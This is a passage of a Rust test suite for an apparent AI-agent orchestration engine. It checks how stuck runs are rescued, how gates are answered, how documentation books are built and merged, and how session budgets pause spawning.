    let rerun = h.spawn_step("spawn implementer phase 1 rescue");
    let ctx = rerun.inputs.instructions.unwrap();
    assert!(ctx.contains("error[E0433]") && ctx.contains("ostra_core"));
}

fn stuck_env(h: &mut H, prefix: &str) -> ExecutionId {
    let (id, _) = h.start(prefix);
    h.finish(
        &id,
        ExecutionStatus::Ok,
        Some(json!({"status": "stuck", "report_path": "/r", "changed_files": [], "summary": "s",
                     "stuck": {"diagnostic": "EROFS: read-only file system, copyfile '/home/u/.yarn/berry/cache/x.zip'", "need": "a writable Yarn cache"}})),
    );
    h.decide(
        JudgeKind::Rescue,
        Some(id.as_str()),
        json!({"action": "advise", "reason": "r"}),
    );
    id
}

#[test]
fn o7_stuck_environment_goes_to_the_advisor_then_reruns_with_its_guidance() {
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    let id = stuck_env(&mut h, "spawn implementer");
    assert_eq!(h.summaries(), vec!["spawn advisor advise p #1"]);
    let adv = h.spawn_step("spawn advisor");
    assert!(adv.inputs.init["Problem"].contains("EROFS"));
    assert_eq!(adv.inputs.init["Failed step"], "implementer");
    assert!(matches!(&adv.purpose, ExecPurpose::Advise { execution, .. } if *execution == id));
    let (a, _) = h.start("spawn advisor");
    assert_eq!(
        h.summaries(),
        vec![] as Vec<String>,
        "nothing starts while the advisor looks"
    );
    h.finish(
        &a,
        ExecutionStatus::Ok,
        Some(json!({"action": "retry", "guidance": "Run yarn with YARN_GLOBAL_FOLDER set.", "reason": "r"})),
    );
    let rerun = h.spawn_step("spawn implementer phase 1 rescue");
    let ctx = rerun.inputs.instructions.unwrap();
    assert!(ctx.contains("EROFS") && ctx.contains("YARN_GLOBAL_FOLDER"));
}

#[test]
fn o7_an_interrupted_advisor_runs_again() {
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    stuck_env(&mut h, "spawn implementer");
    let (a, _) = h.start("spawn advisor");
    h.finish(&a, ExecutionStatus::Interrupted, None);
    assert_eq!(h.summaries(), vec!["spawn advisor advise p #1"]);
}

#[test]
fn o7_an_advisor_escalation_opens_the_stuck_gate_with_its_reason() {
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    stuck_env(&mut h, "spawn implementer");
    h.run(
        "spawn advisor",
        json!({"action": "escalate", "guidance": "", "reason": "Install jest in pallet-mobile."}),
    );
    let steps = h.steps();
    let Some(Step::OpenGate {
        payload: GatePayload::Stuck { need, .. },
        ..
    }) = steps.first()
    else {
        panic!("{:?}", h.summaries())
    };
    assert!(need.contains("a writable Yarn cache") && need.contains("Advisor: Install jest"));
}

#[test]
fn o7_after_max_advice_rounds_advise_becomes_the_gate() {
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    stuck_env(&mut h, "spawn implementer");
    h.run(
        "spawn advisor",
        json!({"action": "retry", "guidance": "g1", "reason": "r"}),
    );
    stuck_env(&mut h, "spawn implementer phase 1 rescue");
    let adv = h.spawn_step("spawn advisor");
    assert!(adv.inputs.init["Earlier guidance"].contains("g1"));
    h.run(
        "spawn advisor",
        json!({"action": "retry", "guidance": "g2", "reason": "r"}),
    );
    stuck_env(&mut h, "spawn implementer phase 1 rescue");
    assert_eq!(h.summaries(), vec!["gate stuck"]);
}

#[test]
fn o7_a_stuck_test_run_shows_its_advisor_on_the_test_card() {
    let phases = json!([phase(1, "p", &[], "Required")]);
    let mut h = H::plan_approved(
        &["p"],
        phases,
        SessionOptions {
            tests: true,
            docs: true,
            yolo: true,
            track: None,
        },
    );
    h.pass_phase(1);
    h.accept();
    h.command(CommandPurpose::Format, "p");
    h.run("spawn execution-path-analyzer epa phase 1", report("/e1"));
    stuck_env(&mut h, "spawn write-test write-test phase 1 initial");
    let (a, _) = h.start("spawn advisor");
    let st = h.state();
    let card = ostra_engine::view::stages(&st)
        .into_iter()
        .find(|c| c.stage == StageKind::WriteTest)
        .unwrap();
    assert!(card.executions.contains(&a));
    assert_eq!(card.status, ostra_core::api::StageStatus::Running);
    assert_eq!(
        card.detail.as_deref(),
        Some("The advisor is looking at the stuck run.")
    );
}

// ------------------------------------------------------------------------------------------
// O8: the user can send an implementer to fix what stopped a stuck run, which then continues.
// ------------------------------------------------------------------------------------------

fn stuck_gate(h: &mut H, prefix: &str) -> (ExecutionId, GateId) {
    let (id, _) = h.start(prefix);
    h.finish(
        &id,
        ExecutionStatus::Ok,
        Some(json!({"status": "stuck", "report_path": "/r", "changed_files": [], "summary": "s",
                     "stuck": {"diagnostic": "error: cannot find module 'orders-client'", "need": "the generated client package"}})),
    );
    h.decide(
        JudgeKind::Rescue,
        Some(id.as_str()),
        json!({"action": "gate", "reason": "r"}),
    );
    let g = h.open_gate("stuck");
    (id, g)
}

fn fix(text: Option<&str>) -> GateAnswer {
    GateAnswer::Choice {
        option: "fix".into(),
        text: text.map(String::from),
    }
}

#[test]
fn o8_a_fix_sends_an_implementer_then_the_stuck_run_continues() {
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    let (stuck, g) = stuck_gate(&mut h, "spawn implementer");
    h.answer(&g, fix(Some("Run the client generator first.")));
    assert_eq!(h.summaries(), vec!["spawn implementer unblock phase 1 #1"]);
    let (f, req) = h.start("spawn implementer unblock");
    assert!(matches!(&req.purpose, ExecPurpose::Unblock { execution, .. } if *execution == stuck));
    let task = req.inputs.instructions.unwrap();
    assert!(task.contains("orders-client") && task.contains("Run the client generator first."));
    assert!(
        req.inputs
            .report_file
            .unwrap()
            .ends_with("ostra-implementer-unblock-phase-1-1.md")
    );
    assert_eq!(
        h.summaries(),
        vec![] as Vec<String>,
        "nothing starts while the fix runs"
    );
    let card = ostra_engine::view::stages(&h.state())
        .into_iter()
        .find(|c| c.stage == StageKind::Implement)
        .unwrap();
    assert!(card.executions.contains(&f));
    h.finish(
        &f,
        ExecutionStatus::Ok,
        Some(json!({"status": "ok", "report_path": "/u", "changed_files": ["gen/client.ts"], "summary": "Generated the client."})),
    );
    let rescue = h.spawn_step("spawn implementer phase 1 rescue");
    assert_eq!(
        rescue.continues,
        Some(stuck),
        "the rescue continues the stuck run, not the fix"
    );
    let ctx = rescue.inputs.instructions.unwrap();
    assert!(
        ctx.contains("orders-client")
            && ctx.contains("Generated the client.")
            && ctx.contains("gen/client.ts")
    );
    assert!(
        h.state().phases[&1]
            .impl_loop
            .changed
            .contains("gen/client.ts")
    );
}

#[test]
fn o8_a_fix_answer_skips_the_route_judge() {
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    let (_, g) = stuck_gate(&mut h, "spawn implementer");
    let st = h.state();
    let payload = &st.gates[&g].payload;
    assert!(!ostra_engine::state::answer_needs_route(
        payload,
        &fix(Some("x"))
    ));
    h.answer(&g, fix(None));
    let req = h.spawn_step("spawn implementer unblock");
    assert!(
        req.inputs
            .instructions
            .unwrap()
            .contains("gave no instructions")
    );
}

#[test]
fn o8_a_fix_that_does_not_finish_reopens_the_stuck_gate() {
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    let (_, g) = stuck_gate(&mut h, "spawn implementer");
    h.answer(&g, fix(Some("x")));
    h.run(
        "spawn implementer unblock",
        json!({"status": "stuck", "report_path": "/u", "changed_files": [], "summary": "STUCK: the generator needs a token."}),
    );
    let steps = h.steps();
    let Some(Step::OpenGate {
        payload: GatePayload::Stuck { need, .. },
        ..
    }) = steps.first()
    else {
        panic!("{:?}", h.summaries())
    };
    assert!(need.contains("the generated client package") && need.contains("needs a token"));
}

#[test]
fn o8_an_interrupted_fix_runs_again() {
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    let (_, g) = stuck_gate(&mut h, "spawn implementer");
    h.answer(&g, fix(Some("x")));
    let (f, _) = h.start("spawn implementer unblock");
    h.finish(&f, ExecutionStatus::Interrupted, None);
    assert_eq!(h.summaries(), vec!["spawn implementer unblock phase 1 #2"]);
}

#[test]
fn o8_yolo_always_sends_a_fix() {
    use ostra_engine::judge_input::{YoloPlan, yolo_plan};
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    let (_, mut g) = stuck_gate(&mut h, "spawn implementer");
    for _ in 0..4 {
        let st = h.state();
        assert!(matches!(
            yolo_plan(&st, &g),
            Some(YoloPlan::Fixed { answer: GateAnswer::Choice { option, text: None }, .. }) if option == "fix"
        ));
        h.answer(&g, fix(None));
        h.run(
            "spawn implementer unblock",
            json!({"status": "ok", "report_path": "/u", "changed_files": [], "summary": "fixed"}),
        );
        g = stuck_gate(&mut h, "spawn implementer phase 1 rescue").1;
    }
}

#[test]
fn stuck_rescue_by_explore() {
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    let (id, _) = h.start("spawn implementer");
    h.finish(&id, ExecutionStatus::Ok, Some(json!({"status": "stuck", "report_path": "/r", "summary": "s", "stuck": {"diagnostic": "d", "need": "n"}})));
    h.decide(JudgeKind::Rescue, Some(id.as_str()), json!({"action": "explore", "explore_task": {"project": "p", "task": "find the working example"}, "reason": "r"}));
    let ex = h.spawn_step("spawn explore");
    assert_eq!(ex.inputs.task.as_deref(), Some("find the working example"));
    h.run("spawn explore", explore_submit(9, &[]));
    let rerun = h.spawn_step("spawn implementer phase 1 rescue");
    assert!(
        rerun
            .inputs
            .instructions
            .unwrap()
            .contains("A targeted explore found")
    );
}

// ------------------------------------------------------------------------------------------
// YOLO: gates are answered by the engine; the review budget rises to 10.
// ------------------------------------------------------------------------------------------

#[test]
fn yolo_answers_gates_and_extends_review_budget() {
    let mut h = H::plan_approved(
        &["p"],
        one_phase(),
        SessionOptions {
            yolo: true,
            ..Default::default()
        },
    );
    h.run("spawn implementer", impl_submit(1, &["src/a.rs"]));
    for i in 1..=9 {
        h.run(
            &format!("spawn code-reviewer review phase 1 #{i}"),
            review(&[finding("HIGH", "R1")]),
        );
        h.run(
            "spawn implementer phase 1 fix",
            impl_submit(1, &["src/a.rs"]),
        );
    }
    h.run(
        "spawn code-reviewer review phase 1 #10",
        review(&[finding("HIGH", "R1"), finding("HIGH", "R2")]),
    );
    assert_eq!(h.summaries(), vec!["judge resolve-review phase:1"]);
    h.decide(JudgeKind::ResolveReview, Some("phase:1"), json!({"action": "fix", "instructions": [{"finding": "R1", "instruction": "do x"}], "reason": "r"}));
    h.run(
        "spawn implementer phase 1 fix",
        impl_submit(1, &["src/a.rs"]),
    );
    // One verification pass; it converged from 2 to 1 open, so another resolution round.
    h.run(
        "spawn code-reviewer review phase 1 #11",
        review(&[finding("HIGH", "R2")]),
    );
    assert_eq!(h.summaries(), vec!["judge resolve-review phase:1"]);
    h.decide(
        JudgeKind::ResolveReview,
        Some("phase:1"),
        json!({"action": "fix", "instructions": [], "reason": "r"}),
    );
    h.run(
        "spawn implementer phase 1 fix",
        impl_submit(1, &["src/a.rs"]),
    );
    // Not converging (1 then 1): the phase is blocked and recorded, with no gate.
    h.run(
        "spawn code-reviewer review phase 1 #12",
        review(&[finding("HIGH", "R2")]),
    );
    assert_eq!(h.summaries(), vec!["blocked phase 1"]);
}

#[test]
fn yolo_gate_gets_a_yolo_answer_step() {
    let mut h = H::explored(
        &["p"],
        SessionOptions {
            yolo: true,
            ..Default::default()
        },
    );
    h.run("spawn generate-spec", spec_submit(1, 0));
    h.open_gate("open_questions");
    assert_eq!(h.summaries(), vec!["yolo-answer"]);
}

// ------------------------------------------------------------------------------------------
// Resume after restart, and the other categories.
// ------------------------------------------------------------------------------------------

#[test]
fn interrupted_execution_reruns() {
    let mut h = H::plan_approved(&["p"], one_phase(), SessionOptions::default());
    let (id, _) = h.start("spawn implementer");
    h.finish(&id, ExecutionStatus::Interrupted, None);
    assert_eq!(h.summaries(), vec!["spawn implementer phase 1 rerun"]);
}

#[test]
fn research_category_ends_after_explore() {
    let mut h = H::new(&["p"], SessionOptions::default());
    h.classify("RESEARCH", &["p"]);
    h.run("spawn explore", explore_submit(0, &[]));
    assert_eq!(h.summaries(), vec!["judge completion"]);
}

#[test]
fn quick_answer_category() {
    let mut h = H::new(&["p"], SessionOptions::default());
    h.decide(JudgeKind::Classify, None, json!({"category": "QUICK_ANSWER", "projects": ["p"], "explore_tasks": [], "opts_in": {"tests": false, "docs": false}, "reason": "r"}));
    h.run("spawn quick-answer", json!({"answer": "42", "sources": []}));
    assert_eq!(h.summaries(), vec!["complete"]);
}

// A quick answer whose harness cannot run opens one harness-failure gate, waits on it, and
// reruns once it is answered (under YOLO, on the native executor).
#[test]
fn quick_answer_harness_failure_opens_one_gate() {
    let mut h = H::new(&["p"], SessionOptions::default());
    h.decide(JudgeKind::Classify, None, json!({"category": "QUICK_ANSWER", "projects": ["p"], "explore_tasks": [], "opts_in": {"tests": false, "docs": false}, "reason": "r"}));
    let (id, _) = h.start("spawn quick-answer");
    h.ev(SessionEvent::ExecutionFinished {
        id,
        result: ExecutionResult {
            status: ExecutionStatus::Error,
            submit: None,
            final_text: String::new(),
            usage: Usage::default(),
            native_session_id: None,
            error: Some("harness-auth: Grok Build is not logged in.".into()),
        },
    });
    assert_eq!(h.summaries(), vec!["gate harness_failure"]);
    let gate = h.open_gate("harness_failure");
    assert_eq!(h.summaries(), Vec::<String>::new());
    h.answer(
        &gate,
        GateAnswer::Choice {
            option: "native".into(),
            text: None,
        },
    );
    let after = h.summaries();
    assert_eq!(after.len(), 1, "{after:?}");
    assert!(after[0].starts_with("spawn quick-answer"), "{after:?}");
}

// Quick answers run natively however the workspace routes executors (HANDOVER 12.3).
#[test]
fn quick_answer_is_forced_native() {
    let mut h = H::new(&["p"], SessionOptions::default());
    h.decide(JudgeKind::Classify, None, json!({"category": "QUICK_ANSWER", "projects": ["p"], "explore_tasks": [], "opts_in": {"tests": false, "docs": false}, "reason": "r"}));
    assert_eq!(h.summaries().len(), 1);
    assert!(h.summaries()[0].starts_with("spawn quick-answer"));
    assert_eq!(
        h.state().forced_executor(AgentName::QuickAnswer),
        Some(ExecutorKind::Native)
    );
    assert_eq!(h.state().forced_executor(AgentName::Explore), None);
}

// Quick change: one implementer pass on the native executor, staged, then completion.
#[test]
fn quick_change_runs_one_native_pass_without_review() {
    let mut h = H::new(&["p"], SessionOptions::default());
    h.decide(JudgeKind::Classify, None, json!({"category": "QUICK_CHANGE", "projects": ["p"], "explore_tasks": [{"project": "p", "task": "ignored"}], "opts_in": {"tests": false, "docs": false}, "reason": "r"}));
    assert_eq!(h.summaries(), vec!["spawn implementer phase 1 initial"]);
    let req = h.spawn_step("spawn implementer");
    assert_eq!(req.inputs.task.as_deref(), Some("Add order cancellation"));
    assert_eq!(
        h.state().forced_executor(AgentName::Implementer),
        Some(ExecutorKind::Native)
    );
    h.run(
        "spawn implementer phase 1 initial",
        impl_submit(1, &["src/a.rs"]),
    );
    assert_eq!(h.summaries(), vec!["command stage p"]);
    h.command(CommandPurpose::Stage, "p");
    assert_eq!(h.summaries(), vec!["judge completion"]);
}

#[test]
fn quick_change_with_nothing_changed_skips_staging() {
    let mut h = H::new(&["p"], SessionOptions::default());
    h.decide(JudgeKind::Classify, None, json!({"category": "QUICK_CHANGE", "projects": ["p"], "explore_tasks": [], "opts_in": {"tests": false, "docs": false}, "reason": "r"}));
    h.run("spawn implementer phase 1 initial", impl_submit(1, &[]));
    assert_eq!(h.summaries(), vec!["judge completion"]);
}

#[test]
fn other_categories_follow_the_routing() {
    let mut h = H::new(&["p"], SessionOptions::default());
    h.classify("IMPLEMENT", &["p"]);
    assert_eq!(h.state().forced_executor(AgentName::Implementer), None);
}

#[test]
fn test_category_skips_the_closing_gate() {
    let mut h = H::new(&["p"], SessionOptions::default());
    h.decide(JudgeKind::Classify, None, json!({"category": "TEST", "projects": ["p"], "explore_tasks": [], "opts_in": {"tests": true, "docs": false}, "reason": "r"}));
    assert_eq!(
        h.summaries(),
        vec!["spawn execution-path-analyzer epa phase 1"]
    );
}

// ------------------------------------------------------------------------------------------
// Documentation books (Rules B1 to B7).
// ------------------------------------------------------------------------------------------

fn docs_submit(project: &str) -> Value {
    json!({
        "status": "ok",
        "summary": format!("Documented {project}."),
        "overview": format!("{project} serves orders."),
        "sections": [{
            "id": format!("{project}-orders"),
            "title": "Orders",
            "purpose": "Creates and cancels orders.",
            "boundaries": {"owns": ["orders table"], "does_not_own": ["payments, owned by billing"]},
            "assumptions": ["Callers are authenticated by the gateway."],
            "business_flow": [{"actor": "Customer", "action": "cancels an order", "outcome": "the order is cancelled"}],
            "diagrams": [{"title": "Cancel", "kind": "sequence", "source": "sequenceDiagram\nC->>API: POST /orders/1/cancel\nAPI-->>C: 204"}],
            "tables": [],
            "concerns": [{"component": "OrderService", "responsibility": "state changes"}],
            "code_refs": [{"path": "src/orders.rs", "symbol": "cancel", "note": "the handler"}],
            "subsections": []
        }],
        "glossary": [{"term": "Order", "definition": format!("A purchase in {project}.")}]
    })
}

fn arch_submit() -> Value {
    json!({
        "status": "ok",
        "summary": "Two services.",
        "architecture": {
            "overview": "The web app calls the API.",
            "diagram": {"title": "Components", "kind": "flowchart", "source": "flowchart LR\nweb -->|HTTP| api"},
            "components": [{"name": "web", "project": "a", "role": "UI", "owns": []}, {"name": "api", "project": "b", "role": "API", "owns": ["orders"]}],
            "links": [{"from": "web", "to": "api", "protocol": "HTTP/JSON", "mode": "sync", "payload": "Order"}],
            "failure_recovery": [{"failure": "api down", "detection": "health check", "recovery": "restart"}],
            "scalability": [{"component": "api", "scales_by": "replicas", "limit": "database connections"}]
        },
        "glossary": []
    })
}

/// A DOCS session whose projects are measured small, so each gets one writer (Rule B9).
fn docs_session(projects: &[&str]) -> H {
    let mut h = docs_session_unplanned(projects);
    for p in projects {
        plan_docs(&mut h, p, vec![]);
    }
    h
}

fn docs_session_unplanned(projects: &[&str]) -> H {
    let mut h = H::new(projects, SessionOptions::default());
    h.decide(JudgeKind::Classify, None, json!({"category": "DOCS", "projects": projects, "explore_tasks": [], "opts_in": {"tests": false, "docs": true}, "reason": "r"}));
    h
}

fn plan_docs(h: &mut H, project: &str, areas: Vec<ostra_core::book::DocsArea>) {
    plan_docs_with(h, project, areas, None, vec![]);
}

fn plan_docs_with(
    h: &mut H,
    project: &str,
    areas: Vec<ostra_core::book::DocsArea>,
    existing: Option<Vec<String>>,
    touched: Vec<String>,
) {
    h.ev(SessionEvent::DocsPlanned {
        project: project.into(),
        areas,
        existing,
        touched,
    });
}

fn area(id: &str) -> ostra_core::book::DocsArea {
    ostra_core::book::DocsArea {
        id: id.into(),
        title: id.into(),
        globs: vec![format!("{id}/**")],
        rest: false,
        bytes: 600 * 1024,
    }
}

#[test]
fn docs_category_skips_the_closing_gate() {
    let mut h = docs_session_unplanned(&["p"]);
    assert_eq!(h.state().category, Some(Category::Docs));
    // Rule B9: the project is measured before its first writer.
    assert_eq!(h.summaries(), vec!["plan-docs p"]);
    plan_docs(&mut h, "p", vec![]);
    assert_eq!(h.summaries(), vec!["spawn documentation docs p"]);
    let r = h.spawn_step("spawn documentation");
    assert_eq!(
        r.inputs.implementer_reports,
        vec![root().join("p").join("ostra-docs-request.md")]
    );
    h.run("spawn documentation docs p", docs_submit("p"));
    // Rule B4: one project, so no architecture; Rule B5: the engine writes the book.
    assert_eq!(h.summaries(), vec!["write-book p"]);
    h.ev(SessionEvent::BookWritten {
        book: "p".into(),
        projects: vec!["p".into()],
        error: None,
    });
    assert_eq!(h.summaries(), vec!["judge completion"]);
}

#[test]
fn b1_a_docs_run_without_a_readable_submit_fails() {
    let mut h = docs_session(&["p"]);
    let (id, _) = h.start("spawn documentation docs p");
    h.finish(&id, ExecutionStatus::Ok, None);
    assert_eq!(h.summaries(), vec!["gate execution_failed"]);
}

#[test]
fn b7_docs_writers_fan_out_under_a_cap() {
    let projects = ["a", "b", "c", "d", "e", "f"];
    let mut h = docs_session(&projects);
    let spawns: Vec<String> = h
        .summaries()
        .into_iter()
        .filter(|s| s.starts_with("spawn documentation"))
        .collect();
    assert_eq!(spawns.len(), ostra_engine::plan::MAX_DOCS_WRITERS);
    let (id, _) = h.start("spawn documentation docs a");
    for p in ["b", "c", "d"] {
        h.start(&format!("spawn documentation docs {p}"));
    }
    assert_eq!(
        h.summaries(),
        vec![] as Vec<String>,
        "the cap holds while four run"
    );
    h.finish(&id, ExecutionStatus::Ok, Some(docs_submit("a")));
    assert_eq!(h.summaries(), vec!["spawn documentation docs e"]);
}

#[test]
fn b9_a_large_projects_areas_each_get_a_writer() {
    let mut h = docs_session_unplanned(&["p"]);
    plan_docs(&mut h, "p", vec![area("core"), area("web")]);
    assert_eq!(
        h.summaries(),
        vec![
            "spawn documentation docs p/core",
            "spawn documentation docs p/web"
        ]
    );
    let r = h.spawn_step("spawn documentation docs p/web");
    assert_eq!(
        r.inputs.docs_area.as_ref().map(|a| a.id.as_str()),
        Some("web")
    );
    assert_eq!(
        r.inputs.docs_areas.len(),
        2,
        "each writer knows the other areas"
    );
    h.run("spawn documentation docs p/core", docs_submit("p"));
    assert_eq!(
        h.summaries(),
        vec!["spawn documentation docs p/web"],
        "the part waits for every area"
    );
    h.run("spawn documentation docs p/web", docs_submit("p"));
    assert_eq!(h.summaries(), vec!["write-book p"]);
    let update = h.state().book_update();
    let ids: Vec<&str> = update.parts[0]
        .1
        .sections
        .iter()
        .map(|s| s.id.as_str())
        .collect();
    assert_eq!(
        ids,
        ["p-orders", "p-orders-web"],
        "a clashing section ID takes its area"
    );
    assert!(update.areas["p"].iter().all(|(_, sub)| sub.is_some()));
}

#[test]
fn b9_area_writers_share_the_session_cap() {
    let mut h = docs_session_unplanned(&["p"]);
    let areas: Vec<_> = ["a", "b", "c", "d", "e", "f"]
        .iter()
        .map(|i| area(i))
        .collect();
    plan_docs(&mut h, "p", areas);
    let spawns = h
        .summaries()
        .into_iter()
        .filter(|s| s.starts_with("spawn documentation"))
        .count();
    assert_eq!(spawns, ostra_engine::plan::MAX_DOCS_WRITERS);
}

#[test]
fn b9_an_abandoned_area_keeps_the_rest_of_the_part() {
    let mut h = docs_session_unplanned(&["p"]);
    plan_docs(&mut h, "p", vec![area("core"), area("web")]);
    h.run("spawn documentation docs p/core", docs_submit("p"));
    let (id, _) = h.start("spawn documentation docs p/web");
    h.finish(&id, ExecutionStatus::Error, None);
    let g = h.open_gate("execution_failed");
    h.answer(
        &g,
        GateAnswer::Choice {
            option: "abandon".into(),
            text: None,
        },
    );
    assert_eq!(h.summaries(), vec!["write-book p"]);
    let update = h.state().book_update();
    assert!(
        update.areas["p"][1].1.is_none(),
        "the web area keeps what the book holds"
    );
}

#[test]
fn b9_after_a_build_only_the_touched_areas_are_rewritten() {
    let mut h = H::plan_approved(
        &["p"],
        one_phase(),
        SessionOptions {
            docs: true,
            tests: false,
            yolo: false,
            track: None,
        },
    );
    h.run("spawn implementer", impl_submit(1, &["web/app.ts"]));
    h.run("spawn code-reviewer", review(&[]));
    h.command(CommandPurpose::Stage, "p");
    h.accept();
    h.command(CommandPurpose::Format, "p");
    let g = h.open_gate("closing_gate");
    h.answer(
        &g,
        GateAnswer::Closing {
            items: vec![ClosingChoice {
                project: "p".into(),
                tests: false,
                docs: true,
            }],
        },
    );
    assert_eq!(h.summaries(), vec!["plan-docs p"]);
    let book_areas = Some(vec!["core".to_string(), "web".to_string()]);
    plan_docs_with(
        &mut h,
        "p",
        vec![area("core"), area("web")],
        book_areas,
        vec!["web".into()],
    );
    assert_eq!(h.summaries(), vec!["spawn documentation docs p/web"]);
    h.run("spawn documentation docs p/web", docs_submit("p"));
    assert_eq!(h.summaries(), vec!["write-book p"]);
    let update = h.state().book_update();
    let kept: Vec<bool> = update.areas["p"].iter().map(|(_, s)| s.is_none()).collect();
    assert_eq!(kept, [true, false], "core is kept from the book");
}

#[test]
fn b9_a_book_without_these_areas_gets_every_area() {
    let mut h = H::plan_approved(
        &["p"],
        one_phase(),
        SessionOptions {
            docs: true,
            tests: false,
            yolo: false,
            track: None,
        },
    );
    h.run("spawn implementer", impl_submit(1, &["web/app.ts"]));
    h.run("spawn code-reviewer", review(&[]));
    h.command(CommandPurpose::Stage, "p");
    h.accept();
    h.command(CommandPurpose::Format, "p");
    let g = h.open_gate("closing_gate");
    h.answer(
        &g,
        GateAnswer::Closing {
            items: vec![ClosingChoice {
                project: "p".into(),
                tests: false,
                docs: true,
            }],
        },
    );
    plan_docs_with(
        &mut h,
        "p",
        vec![area("core"), area("web")],
        Some(vec![]),
        vec!["web".into()],
    );
    assert_eq!(
        h.summaries(),
        vec![
            "spawn documentation docs p/core",
            "spawn documentation docs p/web"
        ]
    );
}

#[test]
fn b4_architecture_runs_only_for_two_or_more_projects() {
    let mut h = docs_session(&["a", "b"]);
    assert_eq!(
        h.summaries(),
        vec!["spawn documentation docs a", "spawn documentation docs b"]
    );
    h.run("spawn documentation docs a", docs_submit("a"));
    assert_eq!(
        h.summaries(),
        vec!["spawn documentation docs b"],
        "the book waits for every part"
    );
    h.run("spawn documentation docs b", docs_submit("b"));
    assert_eq!(
        h.summaries(),
        vec!["spawn system-architecture architecture"]
    );
    let r = h.spawn_step("spawn system-architecture");
    assert_eq!(r.inputs.target, Some(root().join("ostra-docs-parts.json")));
    assert_eq!(
        r.inputs.projects_in_scope,
        vec![
            ("a".to_string(), PathBuf::from("/code/a")),
            ("b".to_string(), PathBuf::from("/code/b"))
        ]
    );
    h.run("spawn system-architecture architecture", arch_submit());
    assert_eq!(h.summaries(), vec!["write-book a_b"]);
}

#[test]
fn b4_an_abandoned_part_leaves_one_project_and_no_architecture() {
    let mut h = docs_session(&["a", "b"]);
    h.run("spawn documentation docs a", docs_submit("a"));
    let (id, _) = h.start("spawn documentation docs b");
    h.finish(&id, ExecutionStatus::Error, None);
    let g = h.open_gate("execution_failed");
    h.answer(
        &g,
        GateAnswer::Choice {
            option: "abandon".into(),
            text: None,
        },
    );
    assert_eq!(h.summaries(), vec!["write-book a"]);
}

#[test]
fn b6_a_picked_book_names_the_write() {
    let mut h = H::new(&["p"], SessionOptions::default());
    if let SessionEvent::SessionCreated { docs_book, .. } = &mut h.events[0].event {
        *docs_book = Some("handbook".into());
    }
    h.decide(JudgeKind::Classify, None, json!({"category": "DOCS", "projects": ["p"], "explore_tasks": [], "opts_in": {"tests": false, "docs": true}, "reason": "r"}));
    plan_docs(&mut h, "p", vec![]);
    h.run("spawn documentation docs p", docs_submit("p"));
    assert_eq!(h.summaries(), vec!["write-book handbook"]);
}

#[test]
fn b6_a_book_update_replaces_the_projects_part() {
    use ostra_core::book::{Book, BookPart, GlossaryEntry, merge};
    let mut h = docs_session(&["a"]);
    h.run("spawn documentation docs a", docs_submit("a"));
    let update = h.state().book_update();
    let at = chrono::Utc::now();
    let old_part = |project: &str| BookPart {
        project: project.into(),
        overview: "old".into(),
        sections: vec![],
        updated_at: at,
        areas: vec![],
    };
    let existing = Book {
        id: "a_b".into(),
        title: String::new(),
        projects: vec!["a".into(), "b".into()],
        updated_at: at,
        sessions: vec!["s0".into()],
        architecture: None,
        parts: vec![old_part("a"), old_part("b")],
        glossary: vec![
            GlossaryEntry {
                term: "order".into(),
                definition: "old".into(),
                code_ref: None,
            },
            GlossaryEntry {
                term: "Invoice".into(),
                definition: "kept".into(),
                code_ref: None,
            },
        ],
    };
    let book = merge(Some(existing), "a_b", &update, at);
    assert_eq!(book.projects, ["a", "b"]);
    assert_eq!(book.parts[0].overview, "a serves orders.");
    assert_eq!(book.parts[0].sections.len(), 1);
    assert_eq!(
        book.parts[1].overview, "old",
        "another project's part is kept"
    );
    let terms: Vec<(&str, &str)> = book
        .glossary
        .iter()
        .map(|g| (g.term.as_str(), g.definition.as_str()))
        .collect();
    assert_eq!(terms, [("Invoice", "kept"), ("Order", "A purchase in a.")]);
    assert_eq!(book.sessions, ["s0", "s1"]);
}

#[test]
fn a_log_recorded_as_unit_test_folds_as_test() {
    let mut h = H::new(&["p"], SessionOptions::default());
    h.decide(JudgeKind::Classify, None, json!({"category": "UNIT_TEST", "projects": ["p"], "explore_tasks": [], "opts_in": {"tests": true, "docs": false}, "reason": "r"}));
    assert_eq!(h.state().category, Some(Category::Test));
    assert_eq!(
        h.summaries(),
        vec!["spawn execution-path-analyzer epa phase 1"]
    );
}

#[test]
fn classify_override_before_work_starts() {
    let mut h = H::new(&["p"], SessionOptions::default());
    h.classify("RESEARCH", &["p"]);
    let st = h.state();
    let id = st.classify.clone().unwrap();
    assert!(st.can_override(&id));
    h.ev(SessionEvent::DecisionOverridden {
        id,
        output: json!({"category": "IMPLEMENT", "projects": ["p"], "explore_tasks": [{"project": "p", "task": "t"}], "opts_in": {"tests": false, "docs": false}, "reason": "user"}),
        reason: "user".into(),
    });
    assert_eq!(
        h.state().category,
        Some(ostra_core::pipeline::Category::Implement)
    );
    h.start("spawn explore");
    let st = h.state();
    assert!(!st.can_override(st.classify.as_ref().unwrap()));
}

#[test]
fn stage_kinds_map_to_lanes() {
    assert_eq!(
        StageKind::FactCheckSpec.lane(),
        ostra_core::pipeline::Lane::Verification
    );
    let _ = AgentName::Explore;
}

// ------------------------------------------------------------------------------------------
// Cost controls: the session budget pauses spawning; YOLO never raises it.
// ------------------------------------------------------------------------------------------

fn spend(h: &mut H, prefix: &str, submit: Value, cost: f64) {
    let (id, _) = h.start(prefix);
    h.ev(SessionEvent::ExecutionFinished {
        id,
        result: ExecutionResult {
            status: ExecutionStatus::Ok,
            submit: Some(submit),
            final_text: String::new(),
            usage: Usage {
                cost_usd: cost,
                ..Default::default()
            },
            native_session_id: None,
            error: None,
        },
    });
}

#[test]
fn budget_pauses_spawns_until_raised() {
    let mut h = H::new(
        &["p"],
        SessionOptions {
            yolo: true,
            track: Some(Track::Full),
            ..Default::default()
        },
    );
    h.ctx.budget_usd = Some(1.0);
    h.classify("IMPLEMENT", &["p"]);
    spend(&mut h, "spawn explore", explore_submit(0, &[]), 1.5);
